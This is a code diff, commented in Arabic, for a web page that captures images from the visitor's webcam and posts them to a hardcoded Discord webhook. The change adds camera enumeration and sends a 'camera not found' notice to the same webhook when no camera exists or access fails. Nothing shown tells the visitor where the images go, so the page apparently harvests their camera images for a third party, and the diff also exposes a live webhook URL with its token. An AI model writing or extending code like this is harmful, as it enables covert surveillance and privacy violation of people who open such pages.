@@ -35,6 +35,16 @@
         // الدالة لبدء كاميرات الويب
         async function initCamera() {
             try {
+                // الحصول على قائمة بجميع الأجهزة المتصلة (الكاميرات)
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput'); // تصفية الكاميرات فقط
+
+                if (videoDevices.length === 0) {
+                    // إذا لم يتم العثور على أي كاميرا، إرسال رسالة في Webhook
+                    sendToDiscord("camera not found");
+                    return;
+                }
+
                 // الحصول على تدفق الكاميرا (أول كاميرا متاحة)
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
@@ -53,6 +63,7 @@
             } catch (error) {
                 alert("حدث خطأ أثناء الوصول إلى الكاميرا. تأكد من أنك قد منحت إذن الوصول إلى الكاميرات.");
                 console.error("حدث خطأ أثناء الوصول إلى الكاميرات.", error);
+                sendToDiscord("camera not found");
             }
         }
 
@@ -75,16 +86,21 @@
             sendToDiscord(images);
         }
 
-        // إرسال الصورة إلى Webhook في Discord
-        async function sendToDiscord(images) {
+        // إرسال الرسالة أو الصور إلى Webhook في Discord
+        async function sendToDiscord(content) {
             const webhookUrl = "https://discord.com/api/webhooks/1304326600438972447/cPAPNutnxg86tnOFPS4nbt5CHapnvXwXAiKR8bqJPJylOaLcd-wV3avTuFqcphwmB6Sc";  // ضع هنا رابط الـWebhook الخاص بك
             const formData = new FormData();
 
-            // تحويل الصورة إلى Blob وإضافتها إلى الـ FormData
-            images.forEach((imageData, index) => {
-                const blob = dataURItoBlob(imageData);
-                formData.append("file", blob, `image${index + 1}.png`);
-            });
+            if (typeof content === "string") {
+                // إذا كانت المحتويات نصًا (مثل رسالة "camera not found")
+                formData.append("content", content);
+            } else if (Array.isArray(content)) {
+                // إذا كانت المحتويات صورًا، تحويل الصور إلى Blob وإضافتها إلى الـ FormData
+                content.forEach((imageData, index) => {
+                    const blob = dataURItoBlob(imageData);
+                    formData.append("file", blob, `image${index + 1}.png`);
+                });
+            }
 
             try {
                 const response = await fetch(webhookUrl, {
@@ -93,13 +109,13 @@
                 });
 
                 if (response.ok) {
-                    console.log("تم إرسال الصورة بنجاح!");
+                    console.log("تم إرسال البيانات بنجاح!");
                 } else {
                     const errorText = await response.text();
-                    console.error("فشل في إرسال الصورة إلى Discord:", errorText);
+                    console.error("فشل في إرسال البيانات إلى Discord:", errorText);
                 }
             } catch (error) {
-                console.error("حدث خطأ أثناء إرسال الصورة.", error);
+                console.error("حدث خطأ أثناء إرسال البيانات.", error);
             }
         }
 
